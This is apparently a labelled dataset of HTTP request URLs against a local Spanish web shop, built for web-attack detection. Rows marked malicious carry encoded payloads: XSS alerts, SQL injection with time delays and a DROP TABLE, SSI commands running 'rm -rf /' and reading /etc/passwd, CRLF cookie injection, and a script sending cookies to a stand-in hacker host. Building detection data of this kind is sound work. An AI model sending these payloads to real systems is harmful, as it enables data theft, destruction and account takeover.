URL,Target
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1227&B1=Pasar+por+caja%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=74&B1=A%F1adir+al+carrito ,0
http://localhost:8080/_vti_inf.html ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%2520 ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=49&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schute&pwd=superfic%21ie&remember=off&B1A=Entrar ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1517&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kuchinsk&pwd=rogadora&remember=off&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leupold&password=f8i73a&nombre=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=1137A&provincia=Zamora&ntc=1281104729948051&B1=Registrar ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kneeshaw&password=4a39c44%EDa&nombre=Romualda&apellidos=Salva+Carol&email=truswell%40soybueno.be&dni=41392002Y&direccion=Calle+Platerias%2C+47+&ciudad=Gor&cp=03158&provincia=C%E1ceres&ntc=4687701725293094&B1=Registrar ,0
http://localhost:8080/tienda1.Old ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tregenza&pwd=ANoa&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/webapp/examples/login.html ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito%252B ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico.OLD ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gonzaga&password=ACoNtecIMIENTO&nombre=Redenta&apellidos=Libano+Parramon&email=vigran%40maletti.cy&dni=24320656L&direccion=Calle+Tagarnina%2C+120%2C+13C&ciudad=Roca+del+Vall%E8s%2C+La&cp=10748&provinciaA=Castell%F3n&ntc=6815796601581594&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E ,1
http://localhost:8080/.OLD ,1
http://localhost:8080/_vti_pvt/ ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.Bak ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/global.Bak ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=5434&B1=Confirmar ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=cecelia&password=terciopelado&nombre=Federica&apellidos=Heusser+Talo&email=sofaer%40multasdetransito.cu&dni=67293578V&direccion=Plza.+Irantzuko+Monasterioaren+63%2C+&ciudad=Purullena&cp=41111&provincia=Lleida&ntc=7562944888996473&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1304&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=earlene&password=SInT%E9TIcA&nombre=Deodato&apellidos=Chen+Bali%F1a&email=chalon%40ingenelec.gl&dni=00776957V&direccion=Calle+La+Ba%F1eza+52+&ciudad=Remolinos&cp=18570&provincia=Castell%F3n&ntc=7967285688712382&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tomaszew&password=capillero&nombre=Robustiana&apellidos=Sabater+Esp%EDndola&emailA=leighton%40pedro-mu%F1oz.gs&dni=33035723H&direccion=C%2F+Transportes+70+&ciudad=B%E1rboles&cp=45517&provincia=Palencia&ntc=6125129848113122&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ranbir&pwd=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=haralamb&password=PO2546OtO4&nombre=Amancio&apellidos=Daya+Basulto&email=gila-berova%40artforall.mm&dni=06314426Y&direccion=C%2F+Plza.+18%2C+6-E&ciudad=Chimillas&cp=19144&provincia=C%E1ceres&ntc=6002328199807748&B1=Registrar ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%22+AND+%221%22%3D%221&password=trariloNgO&nombre=Gelsomino&apellidos=Zuazo+Suela&email=gopi_belcher%40bahiadelasirenas.mq&dni=15074727K&direccion=Baixada+Can+Llobet+124%2C+&ciudad=San+Miguel+de+Bernuy&cp=32089&provincia=Baleares+%28Illes%29&ntc=1285539651029120&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico%27OR%27a%3D%27a&precio=100&cantidad=92&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/index.jsp/.java ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=britney&password=fisgar&nombre=Rosilda&apellidos=Urrutia+Delem%FAs&email=chlud_kumvongse%40encuentrodominios.sd&dni=75436846C&direccion=Burguerins%2C+82%2C+&ciudad=Torreadrada&cp=48031&provincia=A+Coru%F1a&ntc=0518984611180264&B1=Registrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lethia&password=o%24btenible&nombre=-Luigi&apellidos=Feixas&email=kerylen%40sindualidad.bj&dni=84692480V&direccion=Travesia+Echavacoiz+Alto%2C+108%2C+&ciudad=Farrera&cp=23110&provincia=Guadalajara&ntc=6087445564133176&B1=Registrar ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2520 ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=36&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=lizzi&pwd=d2s32Be%F1ArsE&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5685&B1=Confirmar ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/asf-logo-wide ,1
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jaye&pwd=3soMEr%CDA&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=gavens0&pwd=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.INC ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kehoe&password=rose&nombre=Genera&apellidos=Marroig+Cuadra&email=crewes%40softwaresaas.pro&dni=35475568T&direccion=Calle+Isabel+Ii%2C+141+7E&ciudad=Martiherrero&cp=50178&provincia=%3F&ntc=4663857286858703&B1=Registrar ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730.inc ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=stokker&password=do6a3er8&nombre=Leandra&apellidos=Orpez+Almod%F3var&email=schaab%40hispadis.li&dni=96068417Q%3F&direccion=Calle+Montduber+75%2C+12%3FH&ciudad=Magacela&cp=04275&provincia=Lleida&ntc=1530487510362018&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4350&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bau*gnon&password=prusiato&nombre=Samia&apellidos=Catalayud+Mirabet&email=balademas.mareuil6%40enlanzarote.com.vc&dni=28178710F&direccion=C%2F+Cala%2C+9%2C+&ciudad=Mutxamel&cp=25332&provincia=Zaragoza&ntc=8608089924764976&B1=Registrar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=strock&password=1a49e6o301&nombre=Cosme&apellidos=Ar%E1n+Pola&email=bojanic-gidra-tolan%40elcarritodelacompra.ma&dni=77974019V&direccion=C%2F+Honduras%2C+139+7-A&ciudad=Villahermosa+del+R%EDo&cp=34170&provincia=Burgos&ntc=1059928902417697&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5337&B1=Pasar+por+caja ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=67&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/global/titulo.jsp.old ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jemie&password=BisuntA&nombre=Floriana&apellidos=Borb%F3n+Bascomta&email=ballista%40kpincentives.sa&dni=35210254Z&direccion=C%2F+Australia+85%2C+&ciudad=Tierga&cp=22147&provincia=Sevilla&ntc=5010003702753512&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100%2F&cantidad=78&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+AND+%271%27%3D%271&precio=1033&B1=Confirmar ,1
http://localhost:8080/tienda1.old ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=94&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dybenko&pwd=ola&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=%2520&ntc=3044392117548178&B1=Registrar ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bousfiel59&password=De%219%E1n&nombre=Genara&apellidos=Boneton+Casares&email=eckhardt%40englishiseasy.nc&dni=63137047T&direccionA=Pasaje+Calzadilla+14%2C+10%3FH&ciudad=Carboneros&cp=27739&provincia=Madrid&ntc=3702071436789346&B1=Registrar ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=skillen&pwd=pluTocracia&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=retallac&password=guRUpera&nombre=Roger&apellidos=Puppato+Marnetti&email=nilda%40nightflight.ec&dni=09185484C&direccion=Plza.+Mariano+Arregui+Canela+171%2C+&ciudad=B%E1rcena+de+Pie+de+Concha&cp=22200&provincia=Zamora&ntc=8331341352065092&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 ,1
http://localhost:8080/tienda1/imagenes/3.gif.OLD ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ruqiang&pwd=ocelot&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp.java ,1
http://localhost:8080/tienda1/miembros/6909030637832563290.jsp ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=53&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=28&B1=A%F1adir+al+carrito ,1
http://localhost:8080/homepage.nsf ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=juifen5&password=agujer4e2o&nombre=Nazareno&apellidos=Gamb%FAs+Galatioto&email=adams%4011horas.ng&dni=56346174S&direccion=Praza+San+Antonio+Da+Florida%2C+27%2C+&ciudad=Alberuela+de+Tubo&cp=05215&provincia=Salamanca&ntc=5205292790214964&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/1.gif ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bose&password=-hatajaDor&nombre=Isolina&apellidos=Cunillera+Penades&email=frankfather%40andrestabernero.dj&dni=64996573E&direccion=C%2F+Lorenzo+Solano+Tendero%2C+S%2FN+8B&ciudad=Peralejos+de+Arriba&cp=02614&provincia=Navarra&ntc=0659755476152636&B1=Registrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp.inc ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+AND+%271%27%3D%271 ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=severn5&password=02048n3ad1&nombre=Eugenio&apellidos=Pall%E0s+De+Buran&email=walker%40ebaz.vi&dni=88253687L&direccion=Calle+Playa+Del+Carmen%2C+178%2C+2%3FD&ciudad=Marazuela&cp=45510&provincia=Salamanca&ntc=0639487553835350&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5596&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombreA=Vino+Rioja&precio=100&cantidad=79&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico.bak ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39&cantidadA=62&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=6072&B1=Pasar+por+caja ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif.BAK ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=beaumont&password=S9lEva398D59&nombre=Rudy&apellidos=Auladell+Quint%E1s&email=garrick-overton%40corjet.gd&dni=15467411A&direccion=Rou%2Bco+6*8%2C+&ciudad=Arbanc%F3n&cp=37622&provincia=Zamora&ntc=7990892411881647&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7965&B1=Confirmar ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8036&B1=Pasar+por+caja%2F ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/miembros/fotos.jsp/4861362529278789730.Old ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/global.Old ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=judas&pwd=ZaRrAm%24pl%EDN&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.BAK ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=150&B1=Confirmarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A ,1
http://localhost:8080/tienda1/publico/autenticar.jsp/.Inc ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson%40sexl.co&dni=51734480M&direccion=C%2F+Grabador+David+Roberts+154+1-H&ciudad=San+Mart%EDn+y+Mudri%E1n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
